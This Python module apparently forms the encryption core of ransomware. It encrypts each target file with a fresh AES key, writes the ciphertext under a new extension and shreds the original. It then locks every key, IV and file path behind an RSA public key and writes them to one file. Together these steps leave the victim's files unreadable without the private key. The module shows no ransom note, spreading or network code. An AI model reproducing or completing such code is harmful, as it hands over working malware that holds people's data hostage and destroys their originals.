import logging
from os import path
from core.crypto.symmetric_encryption import AES
from core.crypto.asymmetric_encryption import RSA
from os import urandom
from core.config import (
    AES_SECRET_KEY_SIZE_IN_BYTES,
    AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES,
    ENCRYPTED_FILE_EXTENSION,
    ENCRYPTED_AES_KEY_FILE_LOCATION,
    LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION
)
from core.utils.file_ops import read_data_from_file, write_data_to_file, shred_file
from core.utils.generators import generate_rsa_key_pair
from base64 import b64encode


logger = logging.getLogger(__name__)


def encrypt_files(file_path):
    """Encrypt given files with a randomly generated AES key

    Args:
        file_path (str): The absolute path of the file to be encrypted

    Returns:
        list: A list containing base64 encoded AES key, AES initialization vector, the absolute path of the encrypted file
    """    
    logger.info(f"Encrypting file: {file_path}")
    aes_secret_key = urandom(AES_SECRET_KEY_SIZE_IN_BYTES)
    aes_initialization_vector = urandom(AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES)

    symmetric_cipher = AES(aes_secret_key, aes_initialization_vector)
    unencrypted_data = read_data_from_file(file_path)
    encrypted_data = symmetric_cipher.encrypt_data(unencrypted_data)

    new_file_path = f"{file_path}{ENCRYPTED_FILE_EXTENSION}"
    write_data_to_file(new_file_path, encrypted_data)
    shred_file(file_path)

    return [b64encode(aes_secret_key).decode("ascii"), b64encode(aes_initialization_vector).decode("ascii"), b64encode(new_file_path.encode("utf-8")).decode("ascii")]


def encrypt_file_details(cipher, b64encoded_aes_secret_key, b64encoded_initialization_vector, b64encoded_file_path):
    """Encrypts all the AES keys and other details with locally generated RSA key

    Args:
        cipher (RSA): An object of RSA class
        b64encoded_aes_secret_key (str): Base64 encoded AES secret key
        b64encoded_initialization_vector (str): Base64 encoded AES initialization vector
        b64encoded_file_path (str): Base64 encoded file path

    Returns:
        str: The given details encrypted using locally generated RSA key
    """    
    details = f"{b64encoded_aes_secret_key}\t{b64encoded_initialization_vector}\t{b64encoded_file_path}".encode()
    encrypted_data = cipher.encrypt_data(details)
    return encrypted_data


def start_encryption(file_paths):
    """Driver function to encrypt files and their details

    Args:
        file_paths (list): A list of absolute file paths
    """    
    if not path.exists(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION):
        local_public_key = generate_rsa_key_pair()
        write_data_to_file(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION, local_public_key)
    else:
        local_public_key = read_data_from_file(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION)
    
    logger.info("Encryption started")
    cipher = RSA(public_key=local_public_key)
    list_of_file_identifiers = [encrypt_files(file_path) for file_path in file_paths]
    encrypted_file_identifiers = [encrypt_file_details(cipher, file_identifier[0], file_identifier[1], file_identifier[2]) for file_identifier in list_of_file_identifiers]
    write_data_to_file(ENCRYPTED_AES_KEY_FILE_LOCATION, encrypted_file_identifiers, serialized=False)
